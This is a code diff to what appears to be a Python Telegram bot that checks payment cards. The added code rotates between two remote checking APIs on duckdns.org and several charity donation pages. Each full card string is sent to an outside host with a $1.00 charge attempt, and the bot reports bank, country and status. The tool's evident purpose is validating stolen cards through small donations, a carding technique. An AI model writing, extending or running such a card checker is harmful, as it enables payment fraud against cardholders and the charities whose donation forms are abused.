@@ -28,6 +28,13 @@ GATES = [
     "https://raybensch.com/donations/support-ray/",
     "https://www.wfft.org/donations/general-donation/"
 ]
+
+# قائمة APIs للفحص مع التبديل التلقائي
+GATES_CHECK_API = [
+    "http://gatescheck.duckdns.org:5000/check",
+    "http://Gatecheck.duckdns.org:7000/check"
+]
+
 gate_index = 0
 api_semaphore = asyncio.Semaphore(6)
 
@@ -93,13 +100,16 @@ async def get_bin_info(bin_number):
 
 async def check_card_api(card_full):
     global gate_index
-    gate = GATES[gate_index]
-    gate_index = (gate_index + 1) % len(GATES)
+    gate = GATES[gate_index % len(GATES)]  # اختيار gate
+    check_api = GATES_CHECK_API[gate_index % len(GATES_CHECK_API)]  # اختيار api
+    gate_index += 1  # تحديث الفهرس للتبديل التلقائي
+
     params = {"url": gate, "card": card_full, "amount": 1.00}
+
     async with api_semaphore:
         try:
             async with httpx.AsyncClient(timeout=20) as client:
-                r = await client.get("http://gatescheck.duckdns.org:5000/check", params=params)
+                r = await client.get(check_api, params=params)
                 result_raw = r.json().get('result','')
                 result = result_raw.lower()
                 if "charge" in result or "success" in result:
@@ -237,8 +247,8 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
 💳 Last Card: {card_full}
 📨 Response: {response}
 🏦 Info: {last_info}
-🏛 Bank: {last_bank}
-🌍 Country: {last_country}
+🌍 Bank: {last_bank}
+📌 Country: {last_country}
 📌 Status: {status}
 ━━━━━━━━━━━━━━━
 
